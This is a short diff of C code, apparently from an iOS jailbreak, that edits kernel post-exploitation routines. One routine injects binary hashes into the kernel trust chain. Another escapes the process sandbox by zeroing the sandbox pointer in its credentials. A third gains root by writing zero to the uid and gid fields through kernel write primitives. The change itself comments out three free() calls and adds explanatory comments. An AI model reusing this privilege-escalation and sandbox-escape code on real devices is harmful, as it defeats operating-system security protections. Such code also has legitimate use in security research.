@@ -43,9 +43,9 @@ kern_return_t trust_bin(const char *path) {
     kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
     kwrite64(trust_chain, kernel_trust);
     
-    free(allhash);
-    free(allkern);
-    free(amfitab);
+   //free(allhash);
+    //free(allkern);
+    //free(amfitab);
     
     if (rv == 0)
         printf("[*] Successfully trusted binaries? return value=%d numhash=%d\n", rv, numhash);
@@ -57,8 +57,8 @@ kern_return_t trust_bin(const char *path) {
 
 BOOL unsandbox(pid_t pid) {
     uint64_t proc = proc_for_pid(pid);
-    uint64_t ucred = kread64(proc + offsetof_p_ucred);
-    kwrite64(kread64(ucred + 0x78) + 8 + 8, 0x0);
+    uint64_t ucred = kread64(proc + offsetof_p_ucred); //our credentials
+    kwrite64(kread64(ucred + 0x78) + 8 + 8, 0x0); //get rid of sandbox by writing 0x0 to it
     
     return (kread64(kread64(ucred + 0x78) + 8 + 8) == 0) ? YES : NO;
 }
@@ -73,6 +73,7 @@ void empower(pid_t pid) {
 BOOL get_root(pid_t pid) {
     uint64_t proc = proc_for_pid(pid);
     uint64_t ucred = kread64(proc + offsetof_p_ucred);
+    //make everything 0 without setuid(0), pretty straightforward. 
     kwrite32(proc + offsetof_p_uid, 0);
     kwrite32(proc + offsetof_p_ruid, 0);
     kwrite32(proc + offsetof_p_gid, 0);
